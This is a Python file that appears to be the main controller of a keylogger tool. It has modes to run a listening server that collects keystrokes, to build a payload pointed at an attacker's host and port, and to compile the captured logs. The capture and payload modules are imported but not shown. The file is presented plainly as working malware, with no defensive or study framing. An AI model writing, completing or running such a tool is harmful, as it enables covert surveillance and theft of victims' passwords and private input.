from .config import KeyloggerConfig
from .payload_creator import PayloadCreator
from .server import ServerMode
from .log_compiler import LogCompiler


class KeyloggerApp:
    """
    Main application class that coordinates all components
    Orchestrates the configuration, payload creation, and server operation
    """
    
    def __init__(self):
        self.config = KeyloggerConfig()
    
    def run(self):
        """
        Main application entry point
        Parses arguments and executes the selected operation mode
        """
        try:
            # Parse command line arguments
            self.config.parse_arguments()
            
            # Execute based on selected mode
            if self.config.mode == "SM":
                self._run_server_mode()
            elif self.config.mode == "CP":
                self._run_payload_creation()
            elif self.config.mode == "LC":
                self._run_log_compiler()
            else:
                print(f"Error: Unknown mode '{self.config.mode}'")
                exit(1)
                    
        except KeyboardInterrupt:
            print("Canceled by user")
        except Exception as e:
            print(f"Application error: {e}")
    
    def _run_server_mode(self):
        """Run server mode"""
        # Initialize file output if enabled
        if self.config.enable_output_file:
            self.config.keylogger_file = open(self.config.file_path, "w", buffering=1, encoding="utf-8")
        
        if self.config.port is not None:
            server = ServerMode(self.config)
            server.start_server()
        else:
            print("Error : Port not specified")
            exit(1)
    
    def _run_payload_creation(self):
        """Run payload creation mode"""
        if self.config.host is None or self.config.host == "0.0.0.0" or self.config.port is None:
            print("Please specify HOST and PORT for payload")
            exit(1)
        else:
            creator = PayloadCreator(self.config)
            result = creator.create_payload()
            print(result)
    
    def _run_log_compiler(self):
        """Run log compiler mode"""
        if not self.config.input_log_file:
            print("Error: Please specify input log file with -i option")
            exit(1)
        
        compiler = LogCompiler(self.config)
        success = compiler.compile_log()
        
        if success:
            print("Log compilation completed successfully!")
        else:
            print("Log compilation failed!")
            exit(1)